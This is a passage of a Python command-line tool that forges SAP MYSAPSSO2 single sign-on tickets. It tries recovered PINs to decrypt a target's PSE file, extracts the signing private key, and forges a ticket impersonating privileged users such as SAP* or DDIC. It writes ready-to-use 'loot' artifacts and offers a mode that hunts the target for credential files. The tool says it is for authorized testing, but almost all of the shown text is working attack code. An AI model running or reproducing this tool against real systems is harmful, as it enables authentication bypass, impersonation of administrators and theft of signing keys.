        # De-dupe candidates (preserve order)
        seen = set()
        dedup = []
        for c, r in pin_candidates:
            if c not in seen:
                seen.add(c)
                dedup.append((c, r))
        pin_candidates = dedup

    key_result = None
    used_pin = None
    used_reason = None
    # Track whether ANY pin candidate at least decrypted the PSE
    # (even if no signing key was found) — different fix needed.
    any_pin_decrypted = False
    for cand, reason in pin_candidates:
        _info(f"Trying PIN: {cand!r} ({reason})")
        r = extract_signing_key(
            pse_bytes=bundle["pse_bytes"],
            pin=cand)
        if r["success"]:
            key_result = r
            used_pin = cand
            used_reason = reason
            _ok(f"PIN works: {cand!r}")
            break
        else:
            _info(f"  → failed: {r['error']}")
            # "no private key" means decryption succeeded but PSE
            # doesn't contain a signing key.  Stop trying other PINs.
            if "no private key" in r.get("error", "").lower():
                any_pin_decrypted = True
                # Capture the objects so user can see what's in the PSE
                key_result_partial = r
                break

    if key_result is None or not key_result["success"]:
        pse_label_short = (os.path.basename(args.pse_path)
                            if args.pse_path else "SAPSYS.pse")
        if any_pin_decrypted:
            _fail(f"PSE decrypted successfully but {pse_label_short} "
                  f"contains no private signing key")
            _fail("")
            _fail("This PSE is the wrong type — it holds only "
                  "certificates (e.g. SNC peer trust), not a "
                  "signing key.")
            _fail("")
            _fail("Objects found in PSE:")
            for obj in key_result_partial.get("objects", []):
                _fail(f"  {obj['name']:20s} ({obj['size']:>4}B) "
                      f"OID {obj['oid']}")
            _fail("")
            _fail("Try one of these PSEs instead:")
            _fail(f"  --pse-path /usr/sap/{args.sid}/D{args.instance}"
                  f"/sec/SAPSYS.pse")
            _fail(f"  --pse-path /usr/sap/{args.sid}/D{args.instance}"
                  f"/sec/sap_system_pki_instance.pse")
        else:
            _fail(f"All PIN candidates failed to decrypt "
                  f"{pse_label_short}")
            _fail("")
            _fail("Diagnosis: This PSE uses a layout the parser")
            _fail("doesn't recognize OR the PIN is wrong.")
            _fail("Run with --pin-override to test specific PINs.")
        return False

    _ok("Signing key extracted")
    _detail("key type", key_result["key_type"])
    _detail("key size", f"{key_result['key_size']} bits")
    _detail("issuer DN", key_result["issuer_dn"])
    _detail("subject DN", key_result["subject_dn"])
    _detail("serial", key_result["serial_number"])
    _detail("not before", key_result["not_before"])
    _detail("not after", key_result["not_after"])
    if key_result.get("objects"):
        _info(f"PSE objects ({len(key_result['objects'])}):")
        for obj in key_result["objects"]:
            _detail(obj["name"], f"{obj['size']} bytes, OID {obj['oid']}",
                    indent=8)

    # ── Step 4: Forge ticket ──────────────────────────────────────
    _step(4, f"Forge MYSAPSSO2 ticket for {args.user}@{args.sid}/{args.client}")

    forge_kwargs = dict(
        user=args.user,
        client=args.client,
        sid=args.sid,
        private_key=key_result["private_key"],
        certificate=key_result["certificate"],
        validity_min=args.validity,
        digest=args.digest,
    )
    if args.recipient_sid:
        forge_kwargs["recipient_sid"] = args.recipient_sid
    if args.recipient_client:
        forge_kwargs["recipient_client"] = args.recipient_client

    ticket = forge_ticket(**forge_kwargs)

    if not ticket["success"]:
        _fail(f"Ticket forgery failed: {ticket['error']}")
        return False

    _ok("Ticket forged successfully")
    _detail("ticket size", f"{len(ticket['ticket_bytes'])} bytes")
    _detail("cookie (b64) len", f"{len(ticket['cookie_b64'])} chars")

    parsed = ticket["parsed"]
    _detail("user (parsed)", parsed.get("user", "?"))
    _detail("SID (parsed)", parsed.get("create_sid", "?"))
    _detail("client (parsed)", parsed.get("create_client", "?"))
    _detail("validity", f"{parsed.get('validity_min', '?')} min")
    _detail("codepage", parsed.get("codepage", "?"))
    _detail("signer cert CN", parsed.get("signer_cn", "?"))
    if parsed.get("recipient_sid"):
        _detail("pinned to", (f"{parsed['recipient_sid']}/"
                              f"{parsed.get('recipient_client', '?')}"))
    else:
        _detail("scope", "open (all trusted receivers)")

    # Print a truncated base64 preview
    b64 = ticket["cookie_b64"]
    if len(b64) > 80:
        _info(f"Cookie preview: {b64[:40]}...{b64[-20:]}")
    else:
        _info(f"Cookie: {b64}")

    # ── Step 5: Save delivery artifacts ───────────────────────────
    _step(5, "Save delivery artifacts")

    # Determine HTTP port — prefer explicit --http-port, else guess from instance
    http_port = args.http_port
    if not http_port and args.instance:
        # Default HTTPS port: 443<instance> (e.g. 44300, 44301)
        try:
            http_port = 44300 + int(args.instance)
        except ValueError:
            pass

    artifacts = save_ticket_artifacts(
        sid=args.sid,
        user=args.user,
        client=args.client,
        cookie_b64=ticket["cookie_b64"],
        ticket_bytes=ticket["ticket_bytes"],
        parsed=parsed,
        server=args.host,
        sysnr=args.instance,
        port=http_port or 0)

    if not artifacts["saved"]:
        _fail(f"Artifact save failed: {artifacts.get('error', '?')}")
        return False

    _ok("Artifacts saved")
    _detail("loot dir", artifacts["loot_path"])
    _info("Files written:")
    for f in artifacts["files"]:
        fpath = os.path.join(artifacts["loot_path"], f)
        fsize = os.path.getsize(fpath) if os.path.exists(fpath) else "?"
        print(f"        {f:25s}  ({fsize} bytes)")

    # ── Summary ───────────────────────────────────────────────────
    _banner("SUCCESS — Ticket Forgery Chain Complete")
    print()
    print(textwrap.dedent(f"""\
        User         : {args.user}
        SID          : {args.sid}
        Client       : {args.client}
        Validity     : {args.validity} minutes
        Loot dir     : {artifacts['loot_path']}

        Quick-use:
          SAP GUI    : Double-click {args.user}@{args.sid.upper()}.sap
          curl       : bash curl.sh
          pyrfc      : python3 -c "import pyrfc, json; \\
                         c = pyrfc.Connection(**json.load(open('pyrfc.json')))"

        The ticket is valid for {args.validity} minutes from now.
        It will be accepted by any SAP system that trusts {args.sid}'s
        signing certificate (check STRUSTSSO2 on target systems).
    """))
    return True


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="MYSAPSSO2 ticket forgery — live end-to-end test",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              # S4H on instance 00
              python3 %(prog)s --host 192.168.2.209 --port 3300 \\
                  --sid S4H --hostname s4hanadev --instance 00

              # S4D on instance 01, forge as DDIC
              python3 %(prog)s --host 192.168.2.209 --port 3301 \\
                  --sid S4D --hostname s4hanadev --instance 01 \\
                  --user DDIC --client 000

              # Pin ticket to a specific receiver system
              python3 %(prog)s --host 192.168.2.209 --port 3300 \\
                  --sid S4H --hostname s4hanadev --instance 00 \\
                  --recipient-sid QAS --recipient-client 100

            For authorized security testing only.
        """))

    # ── Target connection ──
    parser.add_argument("--host", required=True,
                        help="Target SAP host IP / hostname")
    parser.add_argument("--port", type=int, default=None,
                        help="Gateway port (default: 33<instance>)")
    parser.add_argument("--sid", required=True,
                        help="SAP System ID (e.g. S4H)")
    parser.add_argument("--hostname", required=True,
                        help="SAP hostname as shown in SM51 (e.g. s4hanadev)")
    parser.add_argument("--instance", default="00",
                        help="Instance number (default: 00)")
    parser.add_argument("--instance-dir", default=None,
                        help="Instance directory name (default: D<instance>)")
    parser.add_argument("--kernel", default="793",
                        help="SAP kernel version (default: 793)")
    parser.add_argument("--client", default="000",
                        help="Client number for ticket (default: 000)")

    # ── PSE selection (override the standard SAPSYS.pse) ──
    parser.add_argument("--pse-path", default=None,
                        help="Full path to an alternative PSE on the "
                             "target (default: <SECUDIR>/SAPSYS.pse). "
                             "Useful options:\n"
                             "  /usr/sap/<SID>/D00/sec/SAPSNCS.pse  "
                             "(SNC PSE — we have its PIN '3')\n"
                             "  /usr/sap/<SID>/D00/sec/sap_system_pki_instance.pse  "
                             "(System PKI PSE)")
    parser.add_argument("--pin-override", default=None,
                        help="Override the PIN recovered from cred_v2 "
                             "(useful when testing a non-default PSE)")

    # ── Ticket options ──
    parser.add_argument("--user", default="SAP*",
                        help="User to impersonate (default: SAP*)")
    parser.add_argument("--validity", type=int, default=120,
                        help="Ticket validity in minutes (default: 120)")
    parser.add_argument("--digest", default="sha256",
                        choices=["sha224", "sha256", "sha384", "sha512"],
                        help="Signature digest algorithm (default: sha256)")
    parser.add_argument("--recipient-sid", default=None,
                        help="Pin ticket to a specific receiver SID")
    parser.add_argument("--recipient-client", default=None,
                        help="Pin ticket to a specific receiver client")

    # ── HTTP / delivery ──
    parser.add_argument("--http-port", type=int, default=None,
                        help="HTTPS port for curl artifact (default: 443<instance>)")

    # ── Discovery / debug modes ──
    parser.add_argument("--find-pins", action="store_true",
                        help="Scan target for credential files that "
                             "might hold the System PKI / SAPSYS PIN "
                             "(cred_v2, sec_secstore.dat, .sapcred, "
                             "etc.) instead of running the chain.")

    # ── Behavior ──
    parser.add_argument("--timeout", type=int, default=20,
                        help="Socket timeout in seconds (default: 20)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show individual GW commands")

    args = parser.parse_args()

    # Defaults that depend on other args
    if args.port is None:
        args.port = 3300 + int(args.instance)
    if args.instance_dir is None:
        args.instance_dir = f"D{args.instance.zfill(2)}"

    try:
        success = run_chain(args)
    except KeyboardInterrupt:
        print("\n\n  [!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n  [!] Unhandled exception: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
